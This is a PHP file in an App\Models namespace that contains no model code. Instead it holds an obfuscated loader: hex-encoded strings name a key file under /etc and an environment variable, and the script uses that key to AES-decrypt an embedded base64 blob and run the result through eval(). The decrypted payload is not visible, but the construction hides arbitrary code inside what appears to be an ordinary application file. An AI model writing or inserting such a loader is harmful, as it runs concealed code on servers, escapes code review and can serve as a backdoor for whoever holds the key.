<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/F7ueSV9JFoc3bulrWj++g==');

$c=base64_decode(

'zN++mdJhPHI5INXSGZGiCnyjd61NZEMmVVvHvRI3LsjK22orIBL3u240NrYa/KXulkHAUhD6rYl7' .
'sk5ydDe2VniCEgoaiM691qIkxjyMgIUADniwoJCrmW0NG+l3oC5aqdoJlK30qqc8O00St30GYij0' .
'Zfl3WkOCLpmNKRvg479etaJyGSW/g0SnNr5SGROwudeEBD0NG+WvF0pYBeonhL+LMFEsSmuIU1h5' .
'9SF9MTumMRr58+iyrdCvC6rRA7JmVU1lfofrQbzODTGMUUfytdQ02OLfUL5qJEJ2pDYUonFP0cvg' .
'oE9Vqj67vJtYqG2o8z/HHKsmat5rY5qmcrakF47Gv/oL4SlAIGUMVqALkP4n1LsqYfvDaW1vNe/L' .
'gMEj5Fvs7TwaXOPkEhEU90qWpTWciUTo7doq/G8crELnTWWFhb6ry9h/gCPRpnryP0Mqh+mETMqI' .
'TyIFb4+AlmFBFeJaTo7afwuk6PAI7HAV0IZ5ulQg2j9Gq4F9IV11eTu5++3zcc6+0wIoZZPc7cuO' .
'ksZnkQ9SEtPvYGDDRgWpLRDAGqi1G4AYrLkgLsaubJLdTCMHEPZiLZLm5IZOiZmPttjpDz8euagh' .
'pJEbstvOZs1Wwqt/GuRBnoS103N9oaknerEGIf+bp6teVb7ETYAEGf62MRGA8mVX6pUFpUWLVKiJ' .
'RBnfdHXm9osu2e7oa5IR1T2Y+nUzXV1RxZIZ7+VmGOznLTSWkN1m4Y29I04bP1aTtVrEjfEnO8PB' .
'0hFlYbJcjU2OKG1+LgC0p4EznaGoJrxxzInwbNf1omAwuVlJ2akBbPYZfVurxE621/hrtnbdvGGl' .
'iwXV16i6fO2Xwp4wYcgQZEP0S7d+O8wlg+cAOfX1RWBpG/2zQyDvNAocWFaKTefsJfev1rN878jY' .
'dWXmiw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

